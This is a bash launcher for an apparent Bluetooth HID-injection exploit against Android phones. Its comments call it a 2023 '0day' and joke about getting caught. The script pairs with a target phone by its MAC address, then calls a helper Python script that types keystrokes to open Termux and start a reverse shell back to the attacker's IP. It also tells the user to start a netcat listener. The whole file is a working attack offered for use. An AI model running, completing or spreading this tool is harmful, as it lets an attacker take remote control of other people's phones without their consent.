#PHONE="08:AE:D6:6F:DD:F8"
#LOCAL_IP="10.0.2.2"

# oxagast / Marshall Whittaker
# 0day as of Apr 21, 2023
# if you get caught using this...


PHONE=$1
LOCAL_IP=$2

if [ $# -eq 2 ]; then
echo "[*] Building reverse shell for ${LOCAL_IP}:6543"
echo "[*] Pairing to ${PHONE}"
CONTR=`echo "power on\n\nshow\n\ndiscoverable on\n\npair ${PHONE}\n\ntrust ${PHONE}\n\nconnect ${PHONE}\n\n" | bluetoothctl | grep Controller | cut -d ' ' -f 2`
echo "[!] Paired ${PHONE} to ${CONTR}"
echo "[*] Prepped to send HID shellcode, using finder to find termux, then termux to pop a reverse shell from ${PHONE}..."
echo "[!] Go to another terminal and start a netcat listener on port ${LOCAL_PORT} to handle the shell!"
python3 rougetooth.py "${CONTR}" "${PHONE}" "${LOCAL_IP}"
else echo "Sorry, the syntax is $0 [PHONE BT MAC] [LOCAL IP]"
fi
